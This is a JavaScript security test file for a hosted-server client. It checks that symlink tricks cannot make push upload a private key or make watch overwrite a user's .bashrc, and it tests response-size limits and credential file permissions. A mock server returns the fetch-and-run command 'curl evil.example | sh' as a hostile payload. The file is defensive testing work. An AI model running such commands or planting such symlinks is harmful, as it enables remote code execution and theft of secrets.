// Security review of the hosted-server client (src/remote): what a local
// project can make push upload or watch overwrite, and what a server can make
// the client hold in memory.
import { test } from 'node:test'
import assert from 'node:assert/strict'
import fs from 'node:fs'
import http from 'node:http'
import path from 'node:path'
import { loadConfig } from '../src/config.js'
import { push } from '../src/remote/cli.js'
import { credentialsFile, saveCredential } from '../src/remote/credentials.js'
import { login } from '../src/remote/login.js'
import { createRemote, readCaptureFile } from '../src/remote/remote.js'
import { watchRemote } from '../src/remote/remote-watch.js'
import { SAMPLE, tempDir } from './helpers.js'

const TOKEN = `swp_${'a'.repeat(43)}`
const SECRET = 'SECRET_PRIVATE_KEY_MATERIAL'

function project(name) {
  const dir = tempDir(name)
  const file = path.join(dir, 'shapewall.config.json')
  fs.writeFileSync(file, JSON.stringify(SAMPLE))
  const config = loadConfig(file)
  const captures = path.join(config.outputDir, 'sample', 'captures')
  fs.mkdirSync(captures, { recursive: true })
  fs.writeFileSync(path.join(captures, 'manifest.json'), JSON.stringify({ capturedAt: new Date().toISOString(), pages: {} }))
  const secret = path.join(tempDir(`${name}-home`), 'id_ed25519')
  fs.writeFileSync(secret, SECRET)
  return { file, config, captures, secret }
}

test('readCaptureFile refuses a symlinked capture and a symlinked capture folder', () => {
  const { config, captures, secret } = project('remote-sec-read')
  fs.writeFileSync(path.join(captures, 'home.desktop.png'), 'png')
  assert.equal(readCaptureFile(config, path.join(captures, 'home.desktop.png')).toString(), 'png')
  fs.symlinkSync(secret, path.join(captures, 'home.phone.png'))
  assert.throws(() => readCaptureFile(config, path.join(captures, 'home.phone.png')), /symlinked/)
  const variants = path.join(config.outputDir, 'sample', 'variants')
  fs.symlinkSync(path.dirname(secret), variants)
  fs.copyFileSync(secret, path.join(path.dirname(secret), 'x.desktop.png'))
  assert.throws(() => readCaptureFile(config, path.join(variants, 'x.desktop.png')), /symlinked/)
  assert.throws(() => readCaptureFile(config, secret), /outside the output directory/)
})

test('push never uploads a file a project planted as a symlinked capture', async (t) => {
  const { file, captures, secret } = project('remote-sec-push')
  fs.writeFileSync(path.join(captures, 'home.desktop.png'), 'real capture')
  fs.symlinkSync(secret, path.join(captures, 'home.phone.png'))
  const uploads = []
  const server = http.createServer((req, res) => {
    let body = ''
    req.on('data', (part) => (body += part))
    req.on('end', () => {
      res.setHeader('content-type', 'application/json')
      if (req.method === 'PUT') uploads.push({ url: req.url, body })
      if (req.url === '/api/v1/project') return res.end(JSON.stringify({ workspace: { name: 'W' }, project: { name: 'P' }, boards: [] }))
      if (req.url === '/api/v1/pushes')
        return res.end(JSON.stringify({ id: `ps_${'0'.repeat(24)}`, limits: { png: 1e7, html: 1e7, elements: 1e7 } }))
      res.end(JSON.stringify({ ok: true, files: uploads.length, url: 'x' }))
    })
  })
  await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve))
  t.after(() => server.close())
  const previous = process.env.SHAPEWALL_TOKEN
  process.env.SHAPEWALL_TOKEN = TOKEN
  t.after(() => (previous === undefined ? delete process.env.SHAPEWALL_TOKEN : (process.env.SHAPEWALL_TOKEN = previous)))
  await assert.rejects(
    push({ config: file, remote: `http://127.0.0.1:${server.address().port}` }, () => {}),
    /symlinked/,
  )
  assert.ok(!uploads.some((item) => item.body.includes(SECRET)), 'the planted file was uploaded')
})

test('watch --remote never writes server bytes through a symlink the project planted', async () => {
  const cwd = tempDir('remote-sec-watch')
  const projectId = `pr_${'1'.repeat(24)}`
  const agentDir = path.join(cwd, '.shapewall', 'remote', projectId, 'main', 'agent')
  fs.mkdirSync(agentDir, { recursive: true })
  const victim = path.join(tempDir('remote-sec-watch-home'), '.bashrc')
  fs.writeFileSync(victim, 'original\n')
  for (const name of ['comment-1.png', 'comment-1.html', 'comment-1.json', 'comment-1.log'])
    fs.symlinkSync(victim, path.join(agentDir, name))
  let comment = {
    id: 1,
    status: 'open',
    agentStatus: null,
    body: 'x',
    viewport: { name: 'desktop' },
    replies: [],
    files: { screenshot: 'https://h.example/api/v1/boards/main/a.png', liveHtml: 'https://h.example/api/v1/boards/main/a.html' },
  }
  const remote = {
    origin: 'https://h.example',
    comments: async () => ({ comments: comment.agentStatus === null ? [comment] : [] }),
    comment: async () => ({ comment }),
    setAgentStatus: async (board, id, agentStatus) => {
      comment = { ...comment, agentStatus }
      return { comment, changed: true }
    },
    reply: async () => ({}),
    download: async () => Buffer.from('curl evil.example | sh\n'),
  }
  await watchRemote({
    remote,
    boardId: 'main',
    projectId,
    exec: 'true',
    once: true,
    cwd,
    out: () => {},
    log: () => {},
    env: { PATH: process.env.PATH },
  })
  assert.equal(fs.readFileSync(victim, 'utf8'), 'original\n')
})

test('the client cuts off a server that sends a huge answer', async () => {
  const big = new Uint8Array(4096)
  const fetchImpl = async () => new Response(big, { status: 200, headers: { 'content-type': 'image/png' } })
  const remote = createRemote({ origin: 'https://h.example', token: TOKEN, fetchImpl, maxResponseBytes: 1024 })
  await assert.rejects(remote.download('https://h.example/api/v1/boards/main/a.png'), /too large/)
  const declared = async () =>
    new Response('{}', { status: 200, headers: { 'content-type': 'application/json', 'content-length': String(1e12) } })
  await assert.rejects(createRemote({ origin: 'https://h.example', token: TOKEN, fetchImpl: declared }).project(), /too large/)
  const small = createRemote({
    origin: 'https://h.example',
    token: TOKEN,
    fetchImpl: async () => new Response('{"ok":1}', { headers: { 'content-type': 'application/json' } }),
  })
  assert.deepEqual(await small.project(), { ok: 1 })
})

test('saved logins: the folder is made private and no predictable temporary file is followed', () => {
  const env = { XDG_CONFIG_HOME: tempDir('remote-sec-cred') }
  const file = credentialsFile(env)
  fs.mkdirSync(path.dirname(file), { recursive: true, mode: 0o755 })
  fs.chmodSync(path.dirname(file), 0o755)
  const victim = path.join(tempDir('remote-sec-cred-victim'), 'victim')
  fs.writeFileSync(victim, 'untouched')
  fs.symlinkSync(victim, `${file}.${process.pid}.tmp`)
  saveCredential('https://h.example', { token: TOKEN }, env)
  assert.equal(fs.statSync(path.dirname(file)).mode & 0o777, 0o700)
  assert.equal(fs.statSync(file).mode & 0o777, 0o600)
  assert.equal(fs.readFileSync(victim, 'utf8'), 'untouched')
})

test('login polls at a sane pace whatever interval the server sends', async () => {
  const waits = []
  let polls = 0
  const fetchImpl = async (url) => {
    const reply = (status, body) => new Response(JSON.stringify(body), { status, headers: { 'content-type': 'application/json' } })
    if (url.endsWith('/start')) return reply(201, { deviceCode: 'd', userCode: 'ABCD-EFGH', interval: 'soon', expiresIn: 600 })
    polls += 1
    if (polls < 2) return reply(202, {})
    return reply(200, { status: 'approved', token: TOKEN, scopes: ['read'] })
  }
  await login({ remote: 'https://h.example' }, () => {}, {
    env: { XDG_CONFIG_HOME: tempDir('remote-sec-login') },
    fetchImpl,
    open: () => false,
    sleep: async (ms) => waits.push(ms),
  })
  assert.ok(waits.length >= 2)
  for (const ms of waits) assert.ok(Number.isFinite(ms) && ms >= 1000 && ms <= 30000, String(ms))
})
